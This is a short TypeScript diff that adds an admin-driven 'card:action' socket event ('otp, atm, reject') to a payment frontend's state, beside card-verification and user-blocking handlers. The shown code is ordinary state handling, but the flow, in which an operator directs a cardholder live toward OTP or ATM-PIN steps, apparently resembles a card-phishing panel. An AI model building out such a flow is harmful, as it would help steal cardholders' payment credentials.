@@ -75,6 +75,9 @@ export const isBlocked = signal<boolean>(false);
 // Card Verification
 export const isCardVerified = signal<boolean | null>(null);
 
+// Card Action from Admin (otp, atm, reject)
+export const cardAction = signal<string | null>(null);
+
 // Payment Data (stored in localStorage)
 export interface PaymentData {
   totalPaid?: number;
@@ -201,6 +204,12 @@ export function initializeSocket() {
   s.on("cardNumber:verified", (verified: boolean) => {
     console.log("Card verification result:", verified);
     isCardVerified.value = verified;
+  });
+
+  s.on("card:action", (action: string) => {
+    console.log("Card action received:", action);
+    cardAction.value = action;
+    waitingMessage.value = "";
   });
 
   s.on("blocked", () => {
